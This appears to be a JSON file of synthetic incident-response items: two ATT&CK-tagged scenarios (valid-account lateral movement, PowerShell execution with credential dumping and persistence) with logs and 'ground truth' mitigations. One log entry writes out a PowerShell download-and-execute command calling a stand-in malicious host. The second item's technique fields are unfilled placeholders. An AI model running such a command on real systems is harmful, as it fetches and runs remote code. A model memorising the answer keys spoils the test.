[
    {
        "technique_id_20250405T162818": {
            "incident_id": "58a3d16e-9317-4afa-b998-2de46429bfc1",
            "technique_id": "T1078",
            "technique_desc": "Valid Accounts",
            "incident_description": "A suspicious remote login was detected on Server-1 using legitimate credentials, raising concerns of compromised access. Further investigation revealed that the same valid user account 'jdoe' initiated a remote desktop session from Workstation-12, indicating potential lateral movement exploiting stolen credentials.",
            "attack_logs": [
                {
                    "timestamp": "2023-10-12T09:15:23Z",
                    "host": "Server-1",
                    "action": "User Login",
                    "details": "Successful login by user 'jdoe' using valid domain credentials from internal IP address 192.168.1.50."
                },
                {
                    "timestamp": "2023-10-12T09:17:45Z",
                    "host": "Workstation-12",
                    "action": "Remote Desktop Session Start",
                    "details": "User 'jdoe' initiated an RDP session from Workstation-12 to Server-1 using authenticated access."
                },
                {
                    "timestamp": "2023-10-12T09:20:10Z",
                    "host": "Server-1",
                    "action": "Privilege Escalation Attempt",
                    "details": "User 'jdoe' executed a script in the admin directory, suggesting potential lateral movement via valid credentials."
                }
            ],
            "ground_truth_mitigations": [
                "Reset the password for user 'jdoe' on Server-1 and enforce multi-factor authentication immediately to prevent further unauthorized access.",
                "Review and audit login and RDP session logs from both Server-1 and Workstation-12 to identify any additional misuse of valid credentials.",
                "Reinforce network segmentation between workstations and critical servers to limit remote access paths and isolate potential lateral movement."
            ]
        }
    },
    {
        "technique_id_20250405T162829": {
            "incident_id": "b4c5a60d-fc12-4b9f-8bd5-2f387a15b13d",
            "technique_id": "technique_id",
            "technique_desc": "technique_desc",
            "incident_description": "On October 5, 2023, an adversary exploited a command execution vulnerability by leveraging a scripting interface on Workstation-12 to run a malicious PowerShell command. The attacker then pivoted to Server-1 to access sensitive credentials, and established persistence on Workstation-12 by scheduling a recurring task.",
            "attack_logs": [
                {
                    "timestamp": "2023-10-05T14:23:45Z",
                    "host": "Workstation-12",
                    "action": "Command Execution",
                    "details": "User executed a PowerShell command: IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.com/malware.ps1') indicating potential remote code execution."
                },
                {
                    "timestamp": "2023-10-05T14:25:10Z",
                    "host": "Server-1",
                    "action": "Credential Dumping",
                    "details": "Suspicious PowerShell process attempted to access lsass.exe memory space for credential extraction on Server-1."
                },
                {
                    "timestamp": "2023-10-05T14:27:30Z",
                    "host": "Workstation-12",
                    "action": "Establish Persistence",
                    "details": "Created a scheduled task named 'SystemUpdater' set to execute a malicious script at regular intervals, ensuring continued access."
                }
            ],
            "ground_truth_mitigations": [
                "On Workstation-12, immediately disable the user account that executed the malicious PowerShell command and isolate the system from the network for further forensic analysis.",
                "On Server-1, terminate the suspicious PowerShell process interacting with lsass.exe and conduct a thorough credential compromise investigation.",
                "Remove the 'SystemUpdater' scheduled task on Workstation-12, audit all scheduled tasks, and verify the integrity of scripts set to run persistently."
            ]
        }
    }
]